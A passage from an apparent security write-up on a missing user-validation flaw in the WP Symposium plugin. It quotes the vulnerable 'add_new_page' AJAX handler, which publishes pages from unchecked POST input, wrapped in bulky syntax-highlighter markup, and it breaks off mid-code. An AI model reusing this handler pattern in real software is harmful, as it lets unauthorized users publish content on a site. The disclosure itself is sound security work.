This vulnerability in <a href="http://plugins.trac.wordpress.org/browser/wp-symposium/tags/12.06.30/ajax/symposium_ajax_functions.php?rev=565782">/ajax/symposium_ajax_functions.php</a> is very much like the first one. Again it&#8217;s a lack of validation of the current user. This function, rather than add content to an existing page, serves to allow an user to create a new page with some content(A shortcode specifically, but no validation is made that it is just that). This block of code might look big and scary, big in reality most of the lines are simply SQL queries.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878a68bc1144587852" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
// Add new page
if ($action == "add_new_page") {
	
	global $wpdb, $current_user;

	$r = 'OK';

	$shortcode = $_POST['shortcode'];
	$name = $_POST['name'];
	$post_name = str_replace(' ', '', strtolower($name));
	
	$wpdb-&gt;query( $wpdb-&gt;prepare( "
		INSERT INTO ".$wpdb-&gt;prefix."posts
		( 	post_author, 
			post_date,
			post_date_gmt,
			post_content,
			post_title,
			post_status,
			comment_status,
			ping_status,
			post_name,
			post_modified,
			post_modified_gmt,
			post_parent,
			menu_order,
			post_type,
			comment_count
		)
		VALUES ( %d, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %d, %d, %s, %d )", 
	    array(
	    	$current_user-&gt;ID, 
	    	date("Y-m-d H:i:s"), 
	    	gmdate("Y-m-d H:i:s"),
	    	'['.$shortcode.']',
	    	$name,
	    	'publish',
	    	'closed',
	    	'open',
	    	$post_name,
	    	date("Y-m-d H:i:s"), 
	    	gmdate("Y-m-d H:i:s"),
	    	0,
	    	0,
	    	'page',
	    	0
	    	) 
	    ) );
	    
	    // get new ID
		$new_id = $wpdb-&gt;insert_id;
		
		// page meta data
		$wpdb-&gt;query( $wpdb-&gt;prepare( "
			INSERT INTO ".$wpdb-&gt;base_prefix."postmeta
			( 	post_id, 
				meta_key,
				meta_value
			)
			VALUES ( %d, %s, %s )", 
		    array(
		    	$new_id, 
		    	'_wp_page_template',
		    	'sidebar-page.php'
		    	) 
		    ) );
	    		
	    // update guid
	    $url = get_bloginfo('url');
    	if ($url[strlen($url)-1] == '/') { $url = substr($url,0,-1); }
    	$url .= '/?p='.$new_id;
		$sql = "UPDATE ".$wpdb-&gt;prefix."posts SET guid = '%s' WHERE ID = %d";
		$wpdb-&gt;query($wpdb-&gt;prepare($sql, $url, $new_id)); 
	    	    
	echo $r;
	exit;	
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878a68bc1144587852-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68bc1144587852-2">2</div><div class="crayon-num" data-line="crayon-53c9878a68bc1144587852-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68bc1144587852-4">4</div><div class="crayon-num" data-line="crayon-53c9878a68bc1144587852-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68bc1144587852-6">6</div><div class="crayon-num" data-line="crayon-53c9878a68bc1144587852-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68bc1144587852-8">8</div><div class="crayon-num" data-line="crayon-53c9878a68bc1144587852-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68bc1144587852-10">10</div><div class="crayon-num" data-line="crayon-53c9878a68bc1144587852-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68bc1144587852-12">12</div><div class="crayon-num" data-line="crayon-53c9878a68bc1144587852-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68bc1144587852-14">14</div><div class="crayon-num" data-line="crayon-53c9878a68bc1144587852-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68bc1144587852-16">16</div><div class="crayon-num" data-line="crayon-53c9878a68bc1144587852-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68bc1144587852-18">18</div><div class="crayon-num" data-line="crayon-53c9878a68bc1144587852-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68bc1144587852-20">20</div><div class="crayon-num" data-line="crayon-53c9878a68bc1144587852-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68bc1144587852-22">22</div><div class="crayon-num" data-line="crayon-53c9878a68bc1144587852-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68bc1144587852-24">24</div><div class="crayon-num" data-line="crayon-53c9878a68bc1144587852-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68bc1144587852-26">26</div><div class="crayon-num" data-line="crayon-53c9878a68bc1144587852-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68bc1144587852-28">28</div><div class="crayon-num" data-line="crayon-53c9878a68bc1144587852-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68bc1144587852-30">30</div><div class="crayon-num" data-line="crayon-53c9878a68bc1144587852-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68bc1144587852-32">32</div><div class="crayon-num" data-line="crayon-53c9878a68bc1144587852-33">33</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68bc1144587852-34">34</div><div class="crayon-num" data-line="crayon-53c9878a68bc1144587852-35">35</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68bc1144587852-36">36</div><div class="crayon-num" data-line="crayon-53c9878a68bc1144587852-37">37</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68bc1144587852-38">38</div><div class="crayon-num" data-line="crayon-53c9878a68bc1144587852-39">39</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68bc1144587852-40">40</div><div class="crayon-num" data-line="crayon-53c9878a68bc1144587852-41">41</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68bc1144587852-42">42</div><div class="crayon-num" data-line="crayon-53c9878a68bc1144587852-43">43</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68bc1144587852-44">44</div><div class="crayon-num" data-line="crayon-53c9878a68bc1144587852-45">45</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68bc1144587852-46">46</div><div class="crayon-num" data-line="crayon-53c9878a68bc1144587852-47">47</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68bc1144587852-48">48</div><div class="crayon-num" data-line="crayon-53c9878a68bc1144587852-49">49</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68bc1144587852-50">50</div><div class="crayon-num" data-line="crayon-53c9878a68bc1144587852-51">51</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68bc1144587852-52">52</div><div class="crayon-num" data-line="crayon-53c9878a68bc1144587852-53">53</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68bc1144587852-54">54</div><div class="crayon-num" data-line="crayon-53c9878a68bc1144587852-55">55</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68bc1144587852-56">56</div><div class="crayon-num" data-line="crayon-53c9878a68bc1144587852-57">57</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68bc1144587852-58">58</div><div class="crayon-num" data-line="crayon-53c9878a68bc1144587852-59">59</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68bc1144587852-60">60</div><div class="crayon-num" data-line="crayon-53c9878a68bc1144587852-61">61</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68bc1144587852-62">62</div><div class="crayon-num" data-line="crayon-53c9878a68bc1144587852-63">63</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68bc1144587852-64">64</div><div class="crayon-num" data-line="crayon-53c9878a68bc1144587852-65">65</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68bc1144587852-66">66</div><div class="crayon-num" data-line="crayon-53c9878a68bc1144587852-67">67</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68bc1144587852-68">68</div><div class="crayon-num" data-line="crayon-53c9878a68bc1144587852-69">69</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68bc1144587852-70">70</div><div class="crayon-num" data-line="crayon-53c9878a68bc1144587852-71">71</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68bc1144587852-72">72</div><div class="crayon-num" data-line="crayon-53c9878a68bc1144587852-73">73</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68bc1144587852-74">74</div><div class="crayon-num" data-line="crayon-53c9878a68bc1144587852-75">75</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68bc1144587852-76">76</div><div class="crayon-num" data-line="crayon-53c9878a68bc1144587852-77">77</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878a68bc1144587852-1"><span class="crayon-c">// Add new page</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68bc1144587852-2"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">action</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">"add_new_page"</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c9878a68bc1144587852-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68bc1144587852-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">global</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">current_user</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a68bc1144587852-5">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68bc1144587852-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">r</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">'OK'</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a68bc1144587852-7">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68bc1144587852-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">shortcode</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'shortcode'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a68bc1144587852-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">name</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'name'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68bc1144587852-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">post_name</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">str_replace</span><span class="crayon-sy">(</span><span class="crayon-s">' '</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">''</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">strtolower</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">name</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a68bc1144587852-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68bc1144587852-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">query</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">prepare</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-s">"</span></div><div class="crayon-line" id="crayon-53c9878a68bc1144587852-13"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;INSERT INTO "</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-v">prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"posts</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68bc1144587852-14"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;( &nbsp;&nbsp;&nbsp;&nbsp;post_author, </span></div><div class="crayon-line" id="crayon-53c9878a68bc1144587852-15"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;post_date,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68bc1144587852-16"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;post_date_gmt,</span></div><div class="crayon-line" id="crayon-53c9878a68bc1144587852-17"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;post_content,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68bc1144587852-18"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;post_title,</span></div><div class="crayon-line" id="crayon-53c9878a68bc1144587852-19"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;post_status,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68bc1144587852-20"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;comment_status,</span></div><div class="crayon-line" id="crayon-53c9878a68bc1144587852-21"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ping_status,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68bc1144587852-22"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;post_name,</span></div><div class="crayon-line" id="crayon-53c9878a68bc1144587852-23"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;post_modified,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68bc1144587852-24"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;post_modified_gmt,</span></div><div class="crayon-line" id="crayon-53c9878a68bc1144587852-25"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;post_parent,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68bc1144587852-26"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;menu_order,</span></div><div class="crayon-line" id="crayon-53c9878a68bc1144587852-27"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;post_type,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68bc1144587852-28"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;comment_count</span></div><div class="crayon-line" id="crayon-53c9878a68bc1144587852-29"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;)</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68bc1144587852-30"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VALUES ( %d, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %d, %d, %s, %d )"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-53c9878a68bc1144587852-31"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">array</span><span class="crayon-sy">(</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68bc1144587852-32"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-i">current_user</span><span class="crayon-o">-&gt;</span><span class="crayon-i">ID</span><span class="crayon-sy">,</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-53c9878a68bc1144587852-33"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">date</span><span class="crayon-sy">(</span><span class="crayon-s">"Y-m-d H:i:s"</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68bc1144587852-34"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">gmdate</span><span class="crayon-sy">(</span><span class="crayon-s">"Y-m-d H:i:s"</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c9878a68bc1144587852-35"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'['</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-v">shortcode</span><span class="crayon-sy">.</span><span class="crayon-s">']'</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68bc1144587852-36"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-i">name</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c9878a68bc1144587852-37"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'publish'</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68bc1144587852-38"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'closed'</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c9878a68bc1144587852-39"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'open'</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68bc1144587852-40"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-i">post_name</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c9878a68bc1144587852-41"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">date</span><span class="crayon-sy">(</span><span class="crayon-s">"Y-m-d H:i:s"</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68bc1144587852-42"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">gmdate</span><span class="crayon-sy">(</span><span class="crayon-s">"Y-m-d H:i:s"</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c9878a68bc1144587852-43"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-cn">0</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68bc1144587852-44"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-cn">0</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c9878a68bc1144587852-45"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'page'</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68bc1144587852-46"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-cn">0</span></div><div class="crayon-line" id="crayon-53c9878a68bc1144587852-47"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">)</span><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68bc1144587852-48"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a68bc1144587852-49"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68bc1144587852-50"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">// get new ID</span></div><div class="crayon-line" id="crayon-53c9878a68bc1144587852-51"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">new_id</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-i">insert_id</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68bc1144587852-52"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line" id="crayon-53c9878a68bc1144587852-53"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">// page meta data</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68bc1144587852-54"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">query</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">prepare</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-s">"</span></div><div class="crayon-line" id="crayon-53c9878a68bc1144587852-55"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;INSERT INTO "</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-v">base_prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"postmeta</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68bc1144587852-56"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;( &nbsp;&nbsp;&nbsp;&nbsp;post_id, </span></div><div class="crayon-line" id="crayon-53c9878a68bc1144587852-57"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;meta_key,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68bc1144587852-58"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;meta_value</span></div><div class="crayon-line" id="crayon-53c9878a68bc1144587852-59"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;)</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68bc1144587852-60"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VALUES ( %d, %s, %s )"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-53c9878a68bc1144587852-61"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">array</span><span class="crayon-sy">(</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68bc1144587852-62"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-i">new_id</span><span class="crayon-sy">,</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-53c9878a68bc1144587852-63"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'_wp_page_template'</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68bc1144587852-64"><span 